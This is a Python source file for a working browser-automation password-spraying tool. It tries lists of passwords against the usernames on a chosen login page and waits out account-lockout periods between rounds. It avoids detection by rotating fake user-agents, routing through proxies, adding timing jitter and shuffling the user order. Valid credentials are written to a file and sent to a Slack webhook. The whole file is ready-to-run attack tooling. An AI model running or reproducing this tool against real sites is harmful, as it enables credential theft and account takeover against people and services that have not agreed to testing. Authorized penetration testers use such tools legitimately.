#!/usr/bin/env python3
# MIT License
#
# Copyright (c) 2022 Mayk
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

"""A DOM-based password spraying tool."""
import requests

from random import randrange, shuffle
from sys import exit
from time import sleep
from urllib.parse import urlparse
from argparse import ArgumentParser
from collections import OrderedDict

# Fake User-Agents
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import (
    SoftwareName,
    HardwareType,
    SoftwareType,
    OperatingSystem,
)

# Import selenium packages
from selenium.webdriver import Chrome, Firefox, DesiredCapabilities
from selenium.common.exceptions import TimeoutException, WebDriverException
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.proxy import Proxy, ProxyType
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.firefox.firefox_profile import FirefoxProfile

from webdriver_manager.chrome import ChromeDriverManager
from webdriver_manager.firefox import GeckoDriverManager


# Default mapping of element XPATH's in the authentication process
elements = {
    "username": {"type": "ID", "value": 'user_email'},
    "password": {"type": "ID", "value": 'user_password'},
    "button_submit": {
        "type": "ID",
        "value": 'submit-button'
    }
}
# Colorized output during run
class text_colors:
    red = "\033[91m"
    green = "\033[92m"
    yellow = "\033[93m"
    reset = "\033[0m"


# Class for slack webhook
class SlackWebhook:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url

    # Post a simple update to slack
    def post(self, text):
        block = f"```\n{text}\n```"
        payload = {
            "blocks": [{"type": "section", "text": {"type": "mrkdwn", "text": block}}]
        }
        status = self.__post_payload(payload)
        return status

    # Post a json payload to slack webhook URL
    def __post_payload(self, payload):
        response = requests.post(self.webhook_url, json=payload)
        if response.status_code != 200:
            print(
                "%s[Error] %s%s"
                % (
                    text_colors.red,
                    "Could not send notification to Slack",
                    text_colors.reset,
                )
            )


# General class to run automations
class BrowserEngine:
    # Set User-Agent rotator at the class level
    software_names = [SoftwareName.CHROME.value, SoftwareName.FIREFOX.value]
    software_types = [SoftwareType.WEB_BROWSER.value]
    hardware_types = [HardwareType.COMPUTER.value]
    operating_systems = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value]
    ua_rotator = UserAgent(
        software_names=software_names,
        software_types=software_types,
        hardware_types=hardware_types,
        operating_systems=operating_systems,
    )

    def __init__(self):
        self.driver = None

    def set_proxy(self, proxy):
        raise NotImplementedError()

    def quit(self):
        self.driver.quit()

    def close(self):
        self.driver.close()

    def refresh(self):
        self.driver.refresh()

    def back(self):
        self.driver.execute_script("window.history.go(-1)")

    def clear_cookies(self):
        self.driver.delete_all_cookies()

    def get(self, url):
        self.driver.get(url)

    def find_element(self, type_, value):
        try:
            return self.wait.until(
                lambda driver: driver.find_element(getattr(By, type_), value)
            )
        except TimeoutException:
            return False

    def populate_element(self, element, value, sendenter=False):
        if sendenter:
            element.send_keys(value + Keys.RETURN)
        else:
            element.send_keys(value)

    def is_clickable(self, type_, value):
        return self.wait.until(EC.element_to_be_clickable((getattr(By, type_), value)))

    def click(self, button):
        button.click()

    def submit(self, form):
        form.submit()

    def execute_script(self, code):
        self.driver.execute_script(code)

    def screenshot(self, filename):
        self.driver.get_screenshot_as_file(filename)


# Class for chrome browser
class ChromeBrowserEngine(BrowserEngine):
    driver_path = Chrome()

    def __init__(self, wait=5, proxy=None, headless=False, random_ua=False):
        self.options = ChromeOptions()

        # Set preferences
        self.options.add_argument("--incognito")
        self.options.add_argument("--lang=en-US")
        self.options.add_argument("--no-sandbox")
        self.options.add_argument("--disable-dev-shm-usage")
        self.options.add_argument(
            '--user-agent=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
            'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36""'
        )
        # TODO: fix this
        # self.options.accept_untrusted_certs = True
        # self.options.headless = headless
        self.set_proxy(proxy)
        prefs = {
            "profile.managed_default_content_settings.images": 1,
            "profile.default_content_setting_values.notifications": 2,
            "profile.managed_default_content_settings.stylesheets": 2,
            # "profile.managed_default_content_settings.cookies": 1,
            # "profile.managed_default_content_settings.javascript": 1,
            "profile.managed_default_content_settings.plugins": 1,
            "profile.managed_default_content_settings.popups": 2,
            "profile.managed_default_content_settings.geolocation": 2,
            "profile.managed_default_content_settings.media_stream": 2,
        }
        self.options.add_experimental_option("prefs", prefs)

        self.driver = self.driver_path
        self.driver.set_window_position(0, 0)
        self.driver.set_window_size(1024, 768)
        if random_ua:
            self.driver.execute_cdp_cmd(
                "Network.setUserAgentOverride",
                {"userAgent": self.ua_rotator.get_random_user_agent()},
            )

        self.wait = WebDriverWait(self.driver, wait)

    def set_proxy(self, proxy):
        if proxy is not None:
            self.options.add_argument("--proxy-server=%s" % proxy)


# Class for firefox browser
class FirefoxBrowserEngine(BrowserEngine):
    driver_path = GeckoDriverManager().install()

    def __init__(self, wait=5, proxy=None, headless=False, random_ua=False):
        self.set_proxy(proxy)  # this should be at the top to make effect
        self.options = FirefoxOptions()
        # Set preferences
        self.options.set_preference(
            "permissions.default.image", 2
        )  # Supposed to help with memory issues
        self.options.set_preference("dom.ipc.plugins.enabled.libflashplayer.so", False)
        self.options.set_preference("browser.cache.disk.enable", False)
        self.options.set_preference("browser.cache.memory.enable", False)
        self.options.set_preference("browser.cache.offline.enable", False)
        self.options.set_preference("network.http.use-cache", False)
        self.options.set_preference("intl.accept_languages", "en-US")
        self.options.accept_untrusted_certs = True
        self.options.headless = headless
        if random_ua:
            self.options.set_preference("general.useragent.override", self.ua_rotator.get_random_user_agent())

        self.driver = Firefox(
            options=self.options, service=FirefoxService(self.driver_path)
        )
        self.driver.set_window_position(0, 0)
        self.driver.set_window_size(1024, 768)


        self.wait = WebDriverWait(self.driver, wait)

    def set_proxy(self, proxy):
        if proxy is not None:
            parsed = urlparse(proxy)
            if parsed.scheme == "http":
                DesiredCapabilities.FIREFOX["proxy"] = {
                    "httpProxy": parsed.netloc,
                    "sslProxy": parsed.netloc,
                    "proxyType": "MANUAL",
                }
            elif parsed.scheme.startswith("socks"):
                DesiredCapabilities.FIREFOX["proxy"] = {
                    "socksProxy": parsed.netloc,
                    "socksVersion": int(parsed.scheme[5]),
                    "proxyType": "MANUAL",
                }


# ==========
# Statistics
# ==========
def spray_stats(creds, invalid, args):
    stats_text = "\n%s\n[*] Password Spraying Stats\n%s\n" % ("=" * 27, "=" * 27)
    stats_text += "[*] Total Usernames Tested:  %d\n" % (
        len(creds) + invalid
    )
    stats_text += "[*] Valid Accounts:          %d\n" % len(creds)
    stats_text += "[*] Invalid Usernames:       %d\n" % invalid
    print(stats_text)
    if len(creds) > 0:
        print(f"[+] Writing valid credentials to the file: {args.output}...")
        with open(args.output, "w") as file_:
            for user in creds.keys():
                file_.write("%s\n" % ("%s:%s" % (user, creds[user])))
                # Append to text
                stats_text += "\n%s:%s" % (user, creds[user])
    if args.slack:
        webhook = SlackWebhook(args.slack)
        try:
            webhook.post(stats_text)
        except BaseException as e:
            print("[ERROR] %s" % e)
        else:
            print("[*] Webhook message sent")


# =========================
# General helpers
# =========================
def wait(delay, jitter):
    if jitter == 0:
        sleep(delay)
    else:
        sleep(delay + randrange(jitter))


# =========================
# Data manipulation helpers
# =========================
def loop_dict(dict_):
    for key in dict_.keys():
        yield key


def get_list_from_file(file_):
    with open(file_, "r") as f:
        list_ = [line.strip() for line in f]
    return list_


# =========================
# Password spraying helpers
# =========================
def lockout_reset_wait(lockout):
    print("[*] Sleeping for %.1f minutes" % (lockout))
    sleep(lockout * 60)


def new_browser(driver, args):
    if driver is None or driver == "chrome":
        return ChromeBrowserEngine(
            wait=args.wait, proxy=args.proxy, headless=args.headless, random_ua=args.rua
        )
    elif driver == "firefox":
        return FirefoxBrowserEngine(
            wait=args.wait, proxy=args.proxy, headless=args.headless, random_ua=args.rua
        )


def reset_browser(browser, driver, args):
    browser.quit()
    return new_browser(driver, args)


# Password spray
def spray(args, username_list, password_list):
    creds = {}
    invalid = 0
    counter = 0
    last_index = len(password_list) - 1
    browser = new_browser(args.driver, args)

    for index, password in enumerate(password_list):

        print("[*] Spraying password: %s" % password)

        if args.shuffle:
            shuffle(username_list)
        count_users = len(username_list)
        for useridx, username in enumerate(username_list):

            if counter >= args.reset_after:
                browser = reset_browser(
                    browser, args.driver, args
                )  # Reset the browser to deal with latency issues
                counter = 0

            # Sleep between each user
            if useridx > 0 and args.sleep > 0:
                wait(args.sleep, args.jitter)

            print(
                "[*] Current username (%3d/%d): %s"
                % (useridx + 1, count_users, username)
            )

            counter += 1

            # This seems to helps with memory issues...
            browser.clear_cookies()

            # Reload the page for each username
            retry = 0
            loaded = None
            while loaded is None:
                try:
                    browser.get(args.target)
                    loaded = True
                except BaseException as e:
                    retry += 1
                    if retry == 5:
                        print("[ERROR] %s" % e)
                        exit(1)
                    pass

            wait(args.wait, args.jitter)  # Ensure the previous DOM is stale

            # Change to frame with login form, if necessary
            if args.frame:
                frame_type, frame_value = args.frame.split(":", 1)
                frame = browser.find_element(frame_type, frame_value)
                if not frame:
                    print(
                        "%s[Error] %s%s"
                        % (text_colors.red, "Frame not found", text_colors.reset)
                    )
                    continue
                else:
                    browser.driver.switch_to.frame(frame)

            # Populate the username field
            username_type, username_value = args.uf.split(":", 1)
            username_field = browser.find_element(username_type, username_value)
            if not username_field:
                print(
                    "%s[Error] %s%s"
                    % (text_colors.red, "Username field not found", text_colors.reset)
                )
                continue
            browser.populate_element(username_field, username)

            # Populate the password field
            passwd_type, passwd_value = args.pf.split(":", 1)
            passwd_field = browser.find_element(passwd_type, passwd_value)
            if not passwd_field:
                print(
                    "%s[Error] %s%s"
                    % (text_colors.red, "Password field not found", text_colors.reset)
                )
                continue
            browser.populate_element(passwd_field, password)
            sleep(1)
            # Click submit button
            # Find button and click it
            btsubmit_type, btsubmit_value = args.bt.split(":", 1)
            try:
                browser.click(browser.is_clickable(btsubmit_type, btsubmit_value))
            except BaseException as e:
                print("[ERROR] %s" % e)
                continue

            sleep(1)


            wait(args.wait, args.jitter)  # Ensure the previous DOM is stale


            # Check for invalid password (i.e. returned to login page)
            if (browser.find_element(username_type, username_value)
                and browser.find_element(passwd_type, passwd_value)):
                print(
                    "%s[Invalid Creds] %s:%s%s"
                    % (text_colors.red, username, password, text_colors.reset)
                )
                invalid += 1
            else:
                print(
                    "%s[Found] %s:%s%s"
                    % (text_colors.green, username, password, text_colors.reset)
                )
                creds[username] = password
                # Remove user from list
                username_list.remove(username)
                # Send notification
                if args.slack:
                    notify = SlackWebhook(args.slack)
                    notify.post(
                        f"Valid creds for {args.target}:\n{username}:{password}"
                    )

        # Wait for lockout period if not last password
        if index != last_index:
            lockout_reset_wait(args.lockout)

    browser.quit()
    spray_stats(creds, invalid, args)


# Print the banner
def banner(args):
    BANNER = (
        " .S_sSSs      sSSs_sSSs     .S_SsS_S.     sSSs   .S_sSSs     .S_sSSs     .S_SSSs     .S S.     sSSs   .S_sSSs    \n"
        ".SS~YS%%b    d%%SP~YS%%b   .SS~S*S~SS.   d%%SP  .SS~YS%%b   .SS~YS%%b   .SS~SSSSS   .SS SS.   d%%SP  .SS~YS%%b   \n"
        "S%S   `S%b  d%S'     `S%b  S%S `Y' S%S  d%S'    S%S   `S%b  S%S   `S%b  S%S   SSSS  S%S S%S  d%S'    S%S   `S%b  \n"
        "S%S    S%S  S%S       S%S  S%S     S%S  S%|     S%S    S%S  S%S    S%S  S%S    S%S  S%S S%S  S%S     S%S    S%S  \n"
        "S%S    S&S  S&S       S&S  S%S     S%S  S&S     S%S    d*S  S%S    d*S  S%S SSSS%S  S%S S%S  S&S     S%S    d*S  \n"
        "S&S    S&S  S&S       S&S  S&S     S&S  Y&Ss    S&S   .S*S  S&S   .S*S  S&S  SSS%S   SS SS   S&S_Ss  S&S   .S*S  \n"
        "S&S    S&S  S&S       S&S  S&S     S&S  `S&&S   S&S_sdSSS   S&S_sdSSS   S&S    S&S    S S    S&S~SP  S&S_sdSSS   \n"
        "S&S    S&S  S&S       S&S  S&S     S&S    `S*S  S&S~YSSY    S&S~YSY%b   S&S    S&S    SSS    S&S     S&S~YSY%b   \n"
        "S*S    d*S  S*b       d*S  S*S     S*S     l*S  S*S         S*S   `S%b  S*S    S&S    S*S    S*b     S*S   `S%b  \n"
        "S*S   .S*S  S*S.     .S*S  S*S     S*S    .S*P  S*S         S*S    S%S  S*S    S*S    S*S    S*S.    S*S    S%S  \n"
        "S*S_sdSSS    SSSbs_sdSSS   S*S     S*S  sSS*S   S*S         S*S    S&S  S*S    S*S    S*S     SSSbs  S*S    S&S  \n"
        "SSS~YSSY      YSSP~YSSY    SSS     S*S  YSS'    S*S         S*S    SSS  SSS    S*S    S*S      YSSP  S*S    SSS  \n"
        "                                   SP           SP          SP                 SP     SP             SP          \n"
        "                                   Y            Y           Y                  Y      Y              Y           \n"
        "                                                                                                                 \n"

    )

    _args = vars(args)
    for arg in _args:
        if _args[arg]:
            space = " " * (15 - len(arg))

            BANNER += "\n   > %s%s:  %s" % (arg, space, str(_args[arg]))

            # Add data meanings
            if arg == "lockout":
                BANNER += " minutes"

            if arg in ["wait", "jitter"]:
                BANNER += " seconds"

    BANNER += "\n"
    BANNER += "\n>----------------------------------------<\n"

    print(BANNER)


"""
TODO: docstring
"""
if __name__ == "__main__":
    parser = ArgumentParser(description="Generic DOM-based Password Sprayer.")
    parser.add_argument(
        "-t",
        "--target",
        type=str,
        help="Target URL (required)",
        required=True
    )
    parser.add_argument(
        "-d",
        "--driver",
        type=str,
        choices=["chrome", "firefox"],
        help="Webdriver to be used (default: %(default)s)",
        default="firefox",
    )
    group_user = parser.add_mutually_exclusive_group(required=True)
    group_user.add_argument("-u", "--username", type=str, help="Single username")
    group_user.add_argument(
        "-U", "--usernames", type=str, metavar="FILE", help="File containing usernames"
    )
    group_password = parser.add_mutually_exclusive_group(required=True)
    group_password.add_argument("-p", "--password", type=str, help="Single password")
    group_password.add_argument(
        "-P", "--passwords", type=str, help="File containing passwords", metavar="FILE"
    )
    parser.add_argument(
        "-o",
        "--output",
        type=str,
        default="valid_creds.txt",
        help="Output file (default: %(default)s)",
        required=False,
    )
    parser.add_argument(
        "-r",
        "--reset-after",
        type=int,
        help="Reset browser after N attempts (default: %(default)s)",
        default=1,
        metavar="N",
        dest="reset_after",
    )
    parser.add_argument(
        "-x",
        "--proxy",
        type=str,
        help="Proxy to pass traffic through: <scheme://ip:port>",
        required=False,
    )
    parser.add_argument(
        "--sleep",
        type=float,
        help="Sleep time (in seconds) between each iteration (default: %(default)s)",
        default=0,
        required=False,
    )
    parser.add_argument(
        "--wait",
        type=float,
        help="Time to wait (in seconds) when looking for DOM elements (default: %(default)s)",
        default=3,
        required=False,
    )
    parser.add_argument(
        "--jitter",
        type=int,
        help="Max jitter (in seconds) to be added to wait time (default: %(default)s)",
        default=0,
        required=False,
    )
    parser.add_argument(
        "--lockout",
        type=float,
        required=True,
        help="Lockout policy reset time (in minutes) (required)",
    )
    parser.add_argument(
        "--frame",
        help="Frame containing login form in the form of TYPE:VALUE (default: %(default)s)",
        default=None,
        required=False,
        metavar="TYPE:VALUE"
    )
    parser.add_argument(
        "--uf",
        help="Username field in the form of TYPE:VALUE (default: %(default)s)",
        default=elements["username"]["type"]+":"+elements["username"]["value"],
        metavar="TYPE:VALUE"
    )
    parser.add_argument(
        "--pf",
        help="Password field in the form of TYPE:VALUE (default: %(default)s)",
        default=elements["password"]["type"]+":"+elements["password"]["value"],
        metavar="TYPE:VALUE"
    )
    parser.add_argument(
        "--bt",
        help="Submit button in the form of TYPE:VALUE (default: %(default)s)",
        default=elements["button_submit"]["type"]+":"+elements["button_submit"]["value"],
        metavar="TYPE:VALUE"
    )
    parser.add_argument(
        "--slack",
        type=str,
        help="Slack webhook for sending notifications (default: %(default)s)",
        default=None,
        required=False,
    )
    parser.add_argument(
        "-H",
        "--headless",
        action="store_true",
        help="Run in headless mode",
        required=False,
    )
    parser.add_argument(
        "-s", "--shuffle", action="store_true", help="Shuffle user list", required=False
    )
    parser.add_argument(
        "--rua", action="store_true", help="Use random user-agent", required=False
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true", help="Verbose output", required=False
    )

    args = parser.parse_args()

    assert args.reset_after > 0
    assert args.wait >= 0
    assert args.jitter >= 0
    assert args.lockout >= 0

    if args.proxy:
        if args.proxy[0].isdigit():
            args.proxy = "http://" + args.proxy

    # Print the banner
    banner(args)

    try:
        username_list = (
            [args.username] if args.username else get_list_from_file(args.usernames)
        )

        password_list = (
            [args.password] if args.password else get_list_from_file(args.passwords)
        )
        spray(args, username_list, password_list)
    except IOError as e:
        print(e)
        exit(1)
